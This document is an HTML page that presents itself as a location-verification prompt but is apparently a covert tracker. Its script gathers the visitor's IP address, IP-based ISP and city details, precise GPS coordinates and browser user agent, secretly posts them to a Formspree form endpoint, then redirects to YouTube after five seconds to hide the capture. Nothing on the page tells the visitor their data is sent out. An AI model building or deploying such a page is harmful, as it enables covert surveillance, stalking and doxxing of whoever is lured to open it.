<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Allow Location</title>
  <style>
    body { font-family: sans-serif; text-align: center; padding: 50px; background: #f4f4f4; }
    button { padding: 12px 24px; font-size: 16px; border-radius: 5px; border: none; background: #2196f3; color: white; cursor: pointer; }
    #output { margin-top: 20px; }
    a { color: #2196f3; font-weight: bold; text-decoration: none; }
  </style>
</head>
<body>
  <h2>üìç Please allow location access</h2>
  <p>This helps us verify your location.</p>
  <button onclick="startTracking()">Allow & Continue</button>

  <div id="output"></div>

  <script>
    async function getGeoCoords() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) {
          resolve({ latitude: "Not supported", longitude: "Not supported" });
        } else {
          navigator.geolocation.getCurrentPosition(
            position => {
              resolve({
                latitude: position.coords.latitude,
                longitude: position.coords.longitude
              });
            },
            error => {
              resolve({ latitude: "Permission denied", longitude: "Permission denied" });
            },
            { timeout: 10000 }
          );
        }
      });
    }

    async function startTracking() {
      try {
        const outputDiv = document.getElementById("output");

        // IP
        const ipRes = await fetch('https://api64.ipify.org?format=json');
        const ipJson = await ipRes.json();
        const ip = ipJson.ip;

        // IP location
        const locRes = await fetch(`https://ipwhois.app/json/${ip}`);
        const locData = await locRes.json();

        // GPS
        const gps = await getGeoCoords();
        const lat = gps.latitude;
        const lon = gps.longitude;

        // Show to user:
        if (!isNaN(lat) && !isNaN(lon)) {
          const gmapLink = `https://www.google.com/maps?q=${lat},${lon}`;
          outputDiv.innerHTML = `
            <p><strong>Latitude:</strong> ${lat}</p>
            <p><strong>Longitude:</strong> ${lon}</p>
            <p><a href="${gmapLink}" target="_blank">üåç View on Google Maps</a></p>
          `;
        } else {
          outputDiv.innerHTML = `<p>‚ùå Location access denied or not supported.</p>`;
        }

        // Final data to send
        const data = {
          ip: ip,
          isp: locData.org || 'N/A',
          country: locData.country || 'N/A',
          city: locData.city || 'N/A',
          region: locData.region || 'N/A',
          timezone: locData.timezone || 'N/A',
          latitude: lat,
          longitude: lon,
          user_agent: navigator.userAgent
        };

        // Send to Formspree
        await fetch("https://formspree.io/f/mldnbqvo", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data)
        });

      } catch (err) {
        console.error("Tracking error:", err);
      } finally {
        // You can delay redirect if you want user to see info
        setTimeout(() => {
          window.location.href = "https://youtube.com";
        }, 5000); // 5 seconds delay
      }
    }
  </script>
</body>
</html>
